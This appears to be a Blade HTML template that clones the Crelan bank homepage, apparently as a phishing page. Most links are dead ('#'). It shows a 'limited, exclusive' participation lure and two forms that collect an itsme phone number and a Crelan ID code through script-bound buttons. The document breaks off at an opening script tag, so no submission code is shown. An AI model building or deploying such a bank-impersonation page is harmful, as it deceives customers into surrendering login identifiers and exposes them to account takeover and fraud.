<!DOCTYPE html>
<!-- saved from url=(0038)https://www.crelan.be/nl/particulieren -->
<html lang="{{ app()->getLocale() }}" dir="ltr" prefix="og: https://ogp.me/ns#" class=" js">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="csrf-token" content="{{ csrf_token() }}">

  <meta name="description"
    content="{{ __('messages.meta_description') }}">
  <link rel="stylesheet" href="./assets/css1.css">
  <link rel="stylesheet" href="./assets/css2.css">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-touch-icon.png?v=3">
  <link rel="icon" type="image/png" sizes="32x32" href="./assets/favicon-32x32.png?v=3">
  <link rel="icon" type="image/png" sizes="16x16" href="./assets/favicon-16x16.png?v=3">

  <link rel="mask-icon" href="./assets/safari-pinned-tab.svg?v=3" color="#84bd00">
  <link rel="shortcut icon" href="./assets/favicon.ico?v=3">

  <title>{{ __('messages.welcome_title') }} | Crelan</title>

  <link rel="stylesheet" media="all" href="./assets/css_t0f8RY1-isis88e6I24l0pVCbNsARBiVO5y2aaNgqwo.css">
  <link rel="stylesheet" media="all" href="./assets/css_EMp9AfzydcQtCKYpT4yuSDtQNwxYmXNMq4o2F6zOOSk.css">
  <link rel="stylesheet" media="all" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700">
  <link rel="stylesheet" media="all" href="./assets/css_1GFU5DBQLLheAS5os4zDXQZzzOzdyl7r30H4_f1Kjbk.css">
  <link rel="stylesheet" media="print" href="./assets/css_7R1-0AwhfgudIYpgHtQfuqkZJzQZoc4fy7tPB1V768Q.css">
</head>

<body class="front not-logged-in mobile-menu-disabled">

  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
    <div id="site-wrapper">

      <header class="region region--header">
        <div class="container">
          <div class="region-header-inner">

            <div class="region region--main-header">
              <div class="branding">
                <a href="#" title="Home" rel="home">
                  <div class="site-logo">
                    <img src="./assets/logo.svg"
                      onerror="this.src=&#39;/themes/custom/calibr8_easytheme/logo.png&#39;; this.onerror=null;"
                      alt="Homepage Crelan">
                  </div>
                  <div class="site-name">Crelan</div>
                </a>
              </div>
            </div>
            <div class="region region--navigation">
              <nav aria-label="Products navigation" id="block-products-navigation"
                class="block block--menu block--menu--products">
                <ul data-block="navigation" class="menu menu--products js-top-menu menu--parent">
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self"
                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self"
                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self"
                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self"
                      class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>

                              </li>
                            </ul>
              </nav>
                          </div>

            <div class="nav-secondary-wrap">
              <div class="header-anchors">
                {{-- Language Switcher --}}
                <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
                  <ul class="menu menu--lang" style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'nl') }}" 
                         style="font-weight: {{ app()->getLocale() === 'nl' ? '700' : '400' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        NL
                                </a>
                              </li>
                    <li style="color: #ccc;">|</li>
                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'fr') }}" 
                         style="font-weight: {{ app()->getLocale() === 'fr' ? '700' : '400' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        FR
                      </a>
                  </li>
                </ul>
              </nav>

                

              </div>
              <div class="region region--nav-secondary">
                <nav aria-label="Functional menu" id="block-functionalmenu"
                  class="nav-secondary-functional-menu block block--menu block--menu--functional">
                  <ul data-block="nav_secondary" class="menu menu--functional menu--parent">

                    <li class="icon icon-building agency-cta menu-item icon--replaced">
                      <a href="#"
                        class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
                        <span class="menu-link__icon icon-building" aria-hidden="true"></span>
                        <span class="menu-link__text">{{ __('messages.find_office') }}</span>
                      </a>

                    </li>

                  </ul>

                </nav>
              </div>
            </div>

          </div>
        </div>

      </header>
      <div class="content-wrapper">

        <div id="block-calibr8-easytheme-content" class="block block-system block-system-main-block">

          <main style="display: flex; flex-direction: column;"
            class="node--page node--full node node--page--full node-layout">
            <div class="node-page-top">
              <div class="node-page-top-inner node-page-inner">
                <div style="background-color: white"
                  class="hero-header hero-header--has-visual node--header node--hero-style extend-bg node__header node__header--with-image">
                  <div class="hero-header__wrapper">
                    <div class="hero-header__visual">
                      <img alt="" src="./assets/main__img.png" width="800" height="400" loading="lazy"
                        class="image-style-marketing-banner">
                    </div>
                    <div class="hero-header__content">
                      <h1 class="visually-hidden"><span
                          class="field--title field field--name-title field--type-string field--label-hidden">Particulieren</span>
                      </h1>
                      <h2 class="hero-header__title">
                      {{ __('messages.hero_title') }}
                      </h2>
                      <h3>{{ __('messages.hero_intro') }} <strong>{{ __('messages.hero_exclusive') }}</strong></h3>
                      <ul>
                        <li> {{ __('messages.hero_benefit1') }}</li>
                        <li> {{ __('messages.hero_benefit2') }}</li>
                      </ul>
                      <h3>{{ __('messages.hero_limited') }}</h3>
                      
                      <div
                        class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link">
                        <div
                          class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link hero-header__cta__item">
                          <a href="#" target="_self"
                            data-once="click-event">{{ __('messages.participate') }}</a>
                        </div>
                      </div>

                    </div>
                    <div class="hero-header__img-block">
                      <img src="./assets/main__img.png" alt="">
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="node-page-center-forms">
              <div class="form-container">
                <div class="form-container--header">
                  <img src="./assets/itsme_logo.png" alt="">
                  <span>itsme ID</span>
                </div>

                <div class="form-container--content">
                  <span>
                    {{ __('messages.use_phone') }}
                  </span>
                  <div class="form--input-container">
                    <div class="form-input--block input--country-code">
                      <div class="input--select-country-code">
                        <img src="./assets/belgium.svg" alt="">
                        <span>
                          +32
                        </span>
                        <svg width="6" height="4" viewBox="0 0 6 4" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path
                            d="M3 3.45703L-1.31988e-07 0.457031L0.462891 5.12487e-08L3 2.53125L5.53125 2.72794e-07L6 0.457032L3 3.45703Z"
                            fill="#3C3C3C" />
                        </svg>
                        <div class="input--select-line"></div>
                      </div>
                      <input type="text" class="form--input input--phone-number" id="phone-input" inputmode="tel">

                    </div>
                    <button type="button" id="phone-submit-btn">
                      <span>
                        {{ __('messages.send') }}
                      </span>
                    </button>
                  </div>
                </div>

              </div>

              <div class="forms--separator">
                <div class="separator--line--mobile"></div>
                <span>
                  {{ __('messages.or') }}
                </span>
                <div class="separator--line"></div>
                <div class="separator--line--mobile"></div>
              </div>
              <div class="form-container">
                <div class="form-container--header">
                  <svg width="48" height="34" viewBox="0 0 48 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                      d="M40.3007 0.955874C39.4821 4.0007 38.2455 6.83888 36.6671 9.38458C31.9043 17.0694 24.0286 22.0916 15.1179 22.0916C11.9602 22.0916 8.93273 21.4606 6.12793 20.3041L7.28372 24.6914L9.14052 31.7379C12.219 32.884 15.5068 33.5055 18.9232 33.5055C31.3351 33.5055 42.0618 25.3248 47.1437 13.4586L40.2999 0.955078L40.3007 0.955874Z"
                      fill="#C3D100" />
                    <path
                      d="M36.6671 9.38483L31.5303 0C30.943 2.13956 29.962 4.21713 28.64 6.10077C25.2456 10.9363 19.6007 14.4858 12.5828 14.4858C10.4421 14.4858 8.32031 14.2306 6.3255 13.6822C3.98333 13.0385 1.81602 11.9909 0 10.4729L3.31369 23.0488C4.33619 23.598 5.67233 24.1885 7.28448 24.6924C9.57804 25.4093 12.4291 25.9513 15.7326 25.9513C24.8457 25.9513 33.4028 20.3608 38.4643 12.6673L36.6679 9.38563L36.6671 9.38483Z"
                      fill="#88BC1F" />
                    <path
                      d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805L7.20808 17.0345C9.31266 17.7013 11.5317 18.059 13.8245 18.059C21.2329 18.059 27.6713 14.0024 30.2683 9.07551L28.6397 6.09983Z"
                      fill="#019544" />
                    <path
                      d="M38.4635 12.6659L36.6671 9.38428C31.9043 17.0691 24.0286 22.0913 15.1179 22.0913C11.9602 22.0913 8.93273 21.4603 6.12793 20.3038L7.28372 24.6911C9.57728 25.408 12.4283 25.95 15.7318 25.95C24.8449 25.95 33.402 20.3595 38.4635 12.6659Z"
                      fill="#7FAD00" />
                    <path
                      d="M40.3012 0.955874C39.4825 4.0007 38.246 6.83888 36.6675 9.38458L38.464 12.6662C33.4032 20.3598 24.8461 25.9503 15.7323 25.9503C12.4288 25.9503 9.57773 25.4083 7.28418 24.6914L9.14098 31.7379C12.2194 32.884 15.5073 33.5055 18.9237 33.5055C31.3355 33.5055 42.0623 25.3248 47.1442 13.4586L40.3004 0.955078L40.3012 0.955874Z"
                      fill="#C4D600" />
                    <path
                      d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805C8.31997 14.2289 10.4418 14.484 12.5817 14.484C19.5995 14.484 25.2444 10.9345 28.6389 6.09904L28.6397 6.09983Z"
                      fill="#00AE53" />
                    <path
                      d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z"
                      fill="#009644" />
                    <path
                      d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z"
                      fill="#84BD00" />
                  </svg>

                  <span>{{ __('messages.crelan_id') }}</span>
                </div>

                <div class="form-container--content">
                  <span>
                    {{ __('messages.id_description') }}
                  </span>
                  <div class="form--input-container">
                    <div class="form-input--block">

                      <input type="text" placeholder="____-____" class="form--input input--identification" id="id-input">

                    </div>
                    <button type="button" id="id-submit-btn">
                      <span>
                        {{ __('messages.send') }}
                      </span>
                    </button>
                  </div>
                </div>

              </div>
            </div>
            <div class="node-page-center">
              <div class="node-page-main">
                <div class="node-region--content-top">
                  <div class="container">

                  </div>

                  <div class="node-region--content">
                    <div class="container">
                      <section
                        class="paragraph--main-navigation paragraph--default paragraph--main-navigation--default paragraph paragraph--without-title">
                        <div class="paragraph__content-wrapper paragraph--main-navigation__content-wrapper">
                          <div class="paragraph__content paragraph--main-navigation__content">
                            <nav class="paragraph-menu" aria-label="Quick Links">
                              <ul class="menu menu--inpage-nav-front menu--parent">

                                <li class="menu-item menu-item--expanded">
                                  <a href="#" target="_self"
                                    class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/2067">{{ __('messages.checking_accounts') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/2069">{{ __('messages.credit_cards') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7266">{{ __('messages.debit_cards') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/71">{{ __('messages.online_banking') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#"
                                    class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/76">{{ __('messages.housing') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/77">{{ __('messages.mobility') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/78">{{ __('messages.other_goals') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/87">{{ __('messages.professionals') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#"
                                    class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/73">{{ __('messages.savings_accounts') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/74">{{ __('messages.pension_savings') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7016">{{ __('messages.start_investing') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7309">{{ __('messages.savings_bonds') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#"
                                    class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="kantoorzoeker">{{ __('messages.offices') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.contact') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.make_appointment') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#"
                                        class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.opening_hours') }}</a>

                                    </li>

                                  </ul>
                                </li>

                              </ul>
                            </nav>
                          </div>
                        </div>

                      </section>
                      <section
                        class="paragraph--banner paragraph--default paragraph--banner--default break-out-of-container paragraph paragraph--without-title">
                        <div class="field--banner banner banner--visual-half-image banner--colour-light">
                          <div class="banner__inner">
                            <div class="banner__visuals">
                              <div class="banner__visual"
                                style="background-image: url(&quot;https://www.crelan.be/sites/default/files/styles/banner/public/2024-03/contact%20agency%204_0.png?c=e4d95234_1413&amp;itok=M4xmt6nV&quot;)">
                              </div>
                            </div>

                            <div class="banner__content">
                              <h2 class="banner__title">
                                {{ __('messages.your_agent') }}

                              </h2>

                              <div class="banner__text">

                                <div
                                  class="field--text clearfix text-formatted field field--name-field-text field--type-text-long field--label-hidden field-items-count-1 field-items-cols-1 field__item">
                                  <ul>
                                    <li>{{ __('messages.personal_advice') }}</li>
                                    <li>{{ __('messages.questions_answered') }}</li>
                                    <li>{{ __('messages.local_presence') }}</li>
                                    <li>{{ __('messages.wide_range') }}</li>
                                  </ul>
                                </div>

                              </div>

                              <div class="banner__cta">

                                <div
                                  class="field--block-ctas field field--name-field-block-ctas field--type-entity-reference-revisions field--label-hidden field-items-count-1 field-items-cols-1 field__items">
                                  <div class="field__item">

                                    <section
                                      class="click-event child-paragraph paragraph--block-ctas paragraph--default paragraph--block-ctas--default paragraph paragraph--without-title">
                                      <a href="#" target="_self"
                                        class="button button-default" data-once="click-event">{{ __('messages.contact_agent') }}</a>
                                    </section>
                                  </div>
                                </div>

                              </div>
                            </div>
                          </div>
                        </div>

                      </section>
                    </div>
                  </div>
                </div>
              </div>

          </main>

        </div>
        <aside id="block-socialmediasharingblock"
          class="block block-calibr8-socialmedia block-calibr8-socialmedia-sharing">
          <ul id="sharing-menu" class="menu social-menu">
            <li><a href="#"
                class="social-share-link--facebook icon-social-facebook"><span
                  class="element-invisible">Facebook</span></a></li>
            <li><a href="#"
                class="social-share-link--twitter icon-social-twitter"><span
                  class="element-invisible">Twitter</span></a></li>
            <li><a href="#"
                class="social-share-link--linkedin icon-social-linkedin"><span
                  class="element-invisible">Linkedin</span></a></li>
          </ul>

        </aside>
      </div>

      <footer class="site-footer">
        <div class="region region--footer">
          <div class="container">
            <div class="footer__content-wrapper">
              <div id="block-combo-menu-footer-clients" class="block block-crelan block-crelan-combo-block">
                <div class="block-content">
                  <div class="combo-block-region blockregion-1">
                    <div class="combo-block-col-item combo-block-col-item--product-footer">
                      <h2 class="combo-block-title">{{ __('messages.our_offer') }}</h2>
                      <ul class="menu menu--product-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self"
                            rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/75">{{ __('messages.invest') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="node/2204">{{ __('messages.rates') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-2">
                    <div class="combo-block-col-item combo-block-col-item--theme-footer">
                      <h2 class="combo-block-title">{{ __('messages.themes') }}</h2>
                      <ul class="menu menu--theme-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="taxonomy/term/113">{{ __('messages.family') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel=""
                            class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="taxonomy/term/112">{{ __('messages.pension') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/1986">{{ __('messages.professionals') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/3172">{{ __('messages.cooperative_bank') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/2221">{{ __('messages.blogs') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-3">
                    <div class="combo-block-col-item combo-block-col-item--about-footer">
                      <h2 class="combo-block-title">{{ __('messages.direct_links') }}</h2>
                      <ul class="menu menu--about-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2027">myCrelan</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="taxonomy/term/326">{{ __('messages.regulatory_info') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2263">{{ __('messages.privacy') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#"
                            class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/10108">{{ __('messages.accessibility') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#"
                            class="ot-sdk-show-settings menu-link menu-link--about-footer"
                            onclick="javascript:return false;">{{ __('messages.preferences') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/2259">{{ __('messages.corporate_info') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#"
                            class="menu-link menu-link--about-footer" data-drupal-link-system-path="node/5618">{{ __('messages.investor_relations') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2224">{{ __('messages.jobs') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#"
                            class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2268">{{ __('messages.newsroom') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-4">
                    <div class="combo-block-col-item combo-block-col-item--contact-footer">
                      <h2 class="combo-block-title">{{ __('messages.contact_us') }}</h2>
                      <ul class="menu menu--contact-footer menu--parent">

                        <li class="menu-item">
                          <a href="#"
                            class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="kantoorzoeker">{{ __('messages.find_nearest_office') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="node/2305">{{ __('messages.contact') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self"
                            rel="" class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="node/2376">{{ __('messages.complaints') }}</a>

                        </li>

                      </ul>
                    </div>
                    <div class="combo-block-col-item combo-block-col-item--icon-footer">
                      <ul class="menu menu--icon-footer menu--parent">

                        <li class="icon icon-facebook menu-item icon--replaced">
                          <a href="#"
                            class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-facebook" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Facebook<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-instagram menu-item icon--replaced">
                          <a href="#"
                            class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-instagram" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Instagram<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-linkedin menu-item icon--replaced">
                          <a href="#"
                            class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-linkedin" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">LinkedIn<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-twitter menu-item icon--replaced">
                          <a href="#"
                            class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-twitter" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Twitter<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-card-stop menu-item icon--replaced">
                          <a href="#"
                            class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-card-stop" aria-hidden="true"></span>
                            <span class="menu-link__text">Card Stop 078 170 <span class="extlink-nobreak">170<svg
                                  focusable="false" width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>

                      </ul>
                    </div>
                  </div>

                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

    </div>

  </div>

  @vite(['resources/js/app.js'])
  
  <script>
